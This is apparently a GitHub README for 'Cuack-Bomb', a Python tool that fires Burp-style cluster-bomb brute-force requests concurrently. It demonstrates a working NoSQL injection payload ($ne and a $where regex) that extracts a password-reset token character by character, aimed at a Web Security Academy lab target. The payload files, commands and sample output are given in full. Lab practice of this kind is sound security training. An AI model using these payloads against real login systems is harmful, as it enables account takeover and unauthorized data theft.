# 🚀 Cuack-Bomb - Cluster Bomb Emulator for Burp Suite

**Cuack-Bomb** is a Cluster Bomb emulator for Burp Suite, designed to be **ultra-fast, universal, and automatic**. It allows you to perform brute-force attacks with NoSQL injection and other payloads, processing thousands of combinations in seconds instead of hours.

---

## 📋 Features

✅ **Extreme speed** - 30+ concurrent threads, up to 50x faster than Burp Suite  
✅ **Universal** - Works with any Burp request.txt, no modification needed  
✅ **Auto-detection** - Automatically detects the success keyword  
✅ **HTTP/2 + HTTP/1.1** - Full support for both protocols  
✅ **Flexible payloads** - Supports `.txt` files and inline lists (e.g., `§1,2,3§`)  
✅ **Native CSV** - Results saved in CSV format for Excel analysis  
✅ **No heavy dependencies** - Only uses `requests` and standard libraries  

---

## 🛠️ Installation

```bash
git clone https://github.com/tuusuario/cuack-bomb.git
cd cuack-bomb
pip install requests
or
sudo apt install python3-requests
```

---

## 📂 Project Structure

```
cuack-bomb/
├── cluster-bomb.py      # Main script
├── request.txt           # Burp request with § markers
├── pos.txt              # Payloads for position 1 (e.g., numbers)
├── char.txt             # Payloads for position 2 (e.g., characters)
├── resultados.csv       # Attack results (generated)
└── README.md            # This file
```

---

## 🎯 Quick Usage

```bash
# Basic usage (with automatic keyword detection)
python cluster-bomb.py request.txt

# Specifying output file
python cluster-bomb.py request.txt resultados.csv

# With specific keyword
python cluster-bomb.py request.txt resultados.csv "Account locked"
```

---

## 📝 Format of the `request.txt` File

The file must be exported directly from Burp Suite, **without modifications**:

```http
POST /login HTTP/2
Host: 0a7b00ed04ed3cae809108c100df00f4.web-security-academy.net
Content-Type: application/json
User-Agent: Mozilla/5.0
Cookie: session=...

{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.unlockToken.match('^.{§pos.txt§}§char.txt§.*')"}
```

**The `§` markers** indicate where payloads will be inserted:
- `§pos.txt§` → Loads payloads from the file `pos.txt`
- `§char.txt§` → Loads payloads from the file `char.txt`
- Also supports inline lists: `§0,1,2,3,4,5§`

---

## 📄 Payload Files

### `pos.txt` - Token positions
```
0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
```

### `char.txt` - Possible characters
```
a
b
c
d
e
f
...
z
A
B
C
...
Z
0
1
2
...
9
_
-
```

---

## 📊 Results Analysis

### Console output:
```
[14:00:30] [INFO] === STARTING CLUSTER BOMB EMULATOR ===
[14:00:30] [INFO] Found 2 markers in the request
[14:00:30] [INFO] Total combinations: 1472
[14:00:30] [INFO] Sending 1472 requests with 30 threads...
  Progress: 1472/1472 (100.0%)
[14:01:19] [INFO] Completed in 48.65 seconds
[14:01:19] [SUCCESS] Keyword detected: 'Account locked'
[14:01:19] [SUCCESS] ✅ Found 23 requests with 'Account locked'
[14:01:19] [INFO]   ID 60: 0|8 -> Account locked
[14:01:19] [INFO]   ID 118: 1|2 -> Account locked
[14:01:19] [INFO]   ID 129: 2|b -> Account locked
...
```

### Generated CSV file (`resultados.csv`):
```csv
combination_id,combination,status_code,response_length,response_time,contains_Account_locked,response_preview
60,0|8,200,3500,0.85,True,"<!DOCTYPE html> <html> <!--LAB_HEAD_START--> ..."
118,1|2,200,3500,0.92,True,"<!DOCTYPE html> <html> <!--LAB_HEAD_START--> ..."
```

---

## 🔍 Automatic Keyword Detection

Cuack-Bomb automatically detects the success keyword by comparing:
1. Common patterns: `Account locked`, `Invalid`, `Error`, `Success`, `Welcome`
2. Differences in response length
3. Differences in textual content

**You can also specify it manually:**
```bash
python cluster-bomb.py request.txt resultados.csv "Invalid username"
```

---

## ⚡ Comparative Performance

| Tool | Requests | Time | Speed |
|-------------|------------|--------|-----------|
| Burp Suite (Cluster Bomb) | 1,472 | ~4 hours | 0.1 req/sec |
| **Cuack-Bomb** | 1,472 | **~49 seconds** | **30 req/sec** |

**50x faster!** 🚀

---

## 🎯 Practical Example: Extract NoSQL Token

1. **Export the Burp request**:
```http
POST /login HTTP/1.1
Host: 0a7b00ed04ed3cae809108c100df00f4.web-security-academy.net
Content-Type: application/json

{"username":"carlos","password":{"$ne":"invalid"},"$where":"this.unlockToken.match('^.{§pos.txt§}§char.txt§.*')"}
```

2. **Create the payload files**:
```bash
# pos.txt - numbers 0-20
for i in {0..20}; do echo $i >> pos.txt; done

# char.txt - possible characters
echo "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-" | fold -w1 > char.txt
```

3. **Run the attack**:
```bash
python cluster-bomb.py request.txt
```

4. **Analyze the results**:
The IDs with `Account locked` will show you the token character by character:
```
ID 60: 0|8 -> Account locked   # Position 0 = '8'
ID 118: 1|2 -> Account locked  # Position 1 = '2'
ID 129: 2|b -> Account locked  # Position 2 = 'b'
...
Token: 82bbaad259
```

---

## 🛠️ Advanced Configuration

### Adjust number of threads
```python
emulator = BurpClusterBombEmulator(
    request_file="request.txt",
    max_workers=50,  # More threads = faster
    timeout=5        # Timeout per request
)
```

### Use inline lists (without files)
```http
{"username":"carlos","$where":"this.token.match('^.{§0,1,2,3,4,5,6,7,8,9§}§a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z§.*')"}
```

---

## 🐛 Troubleshooting

### Error: "No § markers found"
Make sure the request body contains `§` marking the payload positions.

### Error: "No Host found in headers"
Verify that the `request.txt` file includes the `Host:` header.

### All requests return 500
- Check your payload syntax (especially JSON)
- Verify that the session cookie is valid
- Make sure the payload files do not contain special characters

---

## 📜 License

MIT License - Free for educational and professional use.

---

## 🤝 Contributions

Contributions are welcome! If you find a bug or want to add a feature:
1. Fork the project
2. Create your branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## 📞 Contact

- **GitHub**: [@akthanon](https://github.com/akthanon)
- **Issues**: [Report bug](https://github.com/akthanon/cuack-bomb/issues)

---

**Made with ❤️ thanks to Deepseek for the offensive security community**
